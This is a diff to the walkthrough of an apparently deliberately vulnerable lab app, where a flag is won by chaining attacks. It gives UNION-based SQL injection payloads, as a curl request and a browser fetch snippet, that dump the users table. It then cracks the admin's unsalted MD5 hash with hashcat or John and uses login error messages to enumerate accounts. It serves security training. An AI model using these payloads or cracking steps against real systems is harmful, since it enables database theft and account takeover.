@@ -4,6 +4,8 @@
 
 This vulnerability demonstrates a critical security flaw where MD5 (Message Digest Algorithm 5) is used for password hashing. MD5 is cryptographically broken and vulnerable to collision attacks, rainbow table lookups, and brute force attacks. This makes it trivial for attackers to recover plaintext passwords from MD5 hashes, especially for weak passwords.
 
+This vulnerability is exploited through a chain attack: first, SQL injection vulnerabilities are used to extract password hashes from the database, then the weak MD5 hashes are cracked to gain admin access.
+
 ## Vulnerability Summary
 
 The application uses MD5 to hash user passwords before storing them in the database. MD5 has been considered cryptographically broken since 2004. It is vulnerable to:
@@ -57,53 +59,107 @@ This vulnerability allows attackers to:
 
 ### How to Retrieve the Flag
 
-To retrieve the flag `OSS{w34k_md5_h4sh1ng}`, you need to exploit the weak MD5 hashing vulnerability combined with account enumeration:
+To retrieve the flag `OSS{w34k_md5_h4sh1ng}`, you need to chain multiple vulnerabilities: use SQL injection to extract password hashes, crack the weak MD5 hashes, and then login as admin.
 
 **Exploitation Steps:**
 
-1. **Discover the data breach**: Navigate to the News page (accessible from the footer) where Fresh Products has announced a data breach
-2. **Examine leaked data**: The News page displays a sample of leaked customer data.
-3. **Crack the MD5 hashes**: Use one of the following methods to crack the MD5 hashes:
+#### Step 1: Extract User Database via SQL Injection
 
-   **Option A: Online Tools**
-   - Visit [CrackStation](https://crackstation.net/) or similar MD5 lookup services
-   - Enter each MD5 hash to recover the plaintext passwords
-   - One hash (`21232f297a57a5a743894a0e4a801fc3`) will reveal the password: `admin`
+The application has two SQL injection vulnerabilities that can be used to extract the user database:
 
-   **Option B: Command Line**
+**Option A: Product Search SQL Injection (unauthenticated)**
 
-   ```bash
-   # Using hashcat
-   hashcat -m 0 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt
+1. Navigate to the Product Search page (`/products/search`)
+2. Enter a SQL injection payload in the search box:
+   ```
+   ' UNION SELECT id, email, password, role, 'img' FROM users--
+   ```
+3. The response will contain user data including emails, password hashes, and roles
 
-   # Using john the ripper
-   echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt
-   john --format=Raw-MD5 hash.txt
+**Using curl:**
+
+```bash
+curl "http://localhost:3000/api/products/search?q='%20UNION%20SELECT%20id,%20email,%20password,%20role,%20'img'%20FROM%20users--"
+```
+
+**Option B: Order Search SQL Injection (requires authentication)**
+
+1. Log in as any user (e.g., `alice@example.com` / `iloveduck`)
+2. Navigate to Order Search (`/orders/search`)
+3. Using browser dev tools or curl, send a malicious request:
+   ```javascript
+   const token = localStorage.getItem("authToken");
+   fetch("/api/orders/search", {
+     method: "POST",
+     headers: {
+       "Content-Type": "application/json",
+       Authorization: `Bearer ${token}`,
+     },
+     body: JSON.stringify({
+       status:
+         "' UNION SELECT id, email, password, role, id, email, password, role, role FROM users--",
+     }),
+   })
+     .then((r) => r.json())
+     .then(console.log);
    ```
 
-4. **Enumerate accounts using login form**: The login form leaks information about which accounts exist through different error messages:
-   - If an account **does not exist**: The error message is `"Invalid credentials"`
-   - If an account **exists but password is wrong**: The error message is `"Invalid password"`
+Both methods will expose user data including the admin account's email and password hash.
 
-   This allows you to enumerate which email addresses are valid accounts. Try common email patterns:
-   - `admin@example.com`
-   - `administrator@oss.com`
-   - `admin@oss.com`
-   - etc.
+#### Step 2: Identify the Admin Account
 
-   When you try `admin@oss.com` with any password, you'll get `"Invalid password"` instead of `"Invalid credentials"`, confirming the account exists.
+From the extracted data, look for users with `role: "ADMIN"`. You will find:
 
-5. **Login as admin**: Use the cracked credentials (`admin@oss.com` / `admin`) to log in
-6. **Access admin panel**: After login, you will be automatically redirected to `/admin`
-7. **Retrieve the flag**: The admin panel will display the flag `OSS{w34k_md5_h4sh1ng}`
+- **Email**: `admin@oss.com`
+- **Password Hash**: `21232f297a57a5a743894a0e4a801fc3`
+
+#### Step 3: Crack the MD5 Hash
+
+Use one of the following methods to crack the admin's MD5 hash:
+
+**Option A: Online Tools**
+
+- Visit [CrackStation](https://crackstation.net/) or similar MD5 lookup services
+- Enter the hash `21232f297a57a5a743894a0e4a801fc3`
+
+**Option B: Command Line**
+
+```bash
+# Using hashcat
+hashcat -m 0 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt
+
+# Using john the ripper
+echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt
+john --format=Raw-MD5 hash.txt
+```
+
+#### Step 4: Login as Admin
+
+1. Navigate to the login page (`/login`)
+2. Enter the cracked credentials:
+   - Email: `admin@oss.com`
+   - Password: `admin`
+3. Submit the form
+
+#### Step 5: Retrieve the Flag
+
+After successful login, you will be automatically redirected to the admin panel (`/admin`) where the flag `OSS{w34k_md5_h4sh1ng}` is displayed.
+
+### Alternative: Account Enumeration
+
+If you only have the password hash without the email (e.g., from a partial data leak), you can use account enumeration via the login form:
+
+- If an account **does not exist**: The error message is `"Invalid credentials"`
+- If an account **exists but password is wrong**: The error message is `"Invalid password"`
+
+Try common email patterns like `admin@oss.com`, `admin@example.com`, `administrator@oss.com` to identify valid accounts.
 
 ### Why This Works
 
-- MD5 hashes for common passwords like "admin" are well-documented in rainbow tables
-- The hash `21232f297a57a5a743894a0e4a801fc3` is the MD5 hash of "admin"
-- Without salt, identical passwords always produce identical hashes
-- Online databases contain millions of pre-computed MD5 hashes for common passwords
-- The login endpoint returns different error messages based on whether an account exists, enabling account enumeration
+- **SQL Injection exposes the database**: The two SQL injection vulnerabilities allow extracting the entire users table
+- **MD5 is trivially crackable**: The hash `21232f297a57a5a743894a0e4a801fc3` is the MD5 hash of "admin" - a password found in every rainbow table
+- **No salt**: Without salt, identical passwords always produce identical hashes, making rainbow table attacks effective
+- **Privilege escalation**: Once the admin password is cracked, full admin access is gained
 
 ### Code Fixes
 
@@ -149,9 +205,10 @@ The flag for this vulnerability is: **OSS{w34k_md5_h4sh1ng}**
 
 The flag can be retrieved by:
 
-1. Finding the leaked password hashes on the News page (emails are not included in the leak)
-2. Cracking the MD5 hashes to recover plaintext passwords
-3. Using account enumeration via the login form to identify which email addresses exist
-4. Identifying the admin account email address
-5. Logging in with the admin credentials
-6. Accessing the admin panel where the flag will be displayed
+1. Using SQL injection (Product Search or Order Search) to extract the users table from the database
+2. Identifying the admin account (`admin@oss.com`) and its password hash
+3. Cracking the MD5 hash to recover the plaintext password (`admin`)
+4. Logging in with the admin credentials
+5. Accessing the admin panel where the flag is displayed
+
+This demonstrates a realistic attack chain where multiple vulnerabilities (SQL injection + weak password hashing) are combined to achieve privilege escalation.
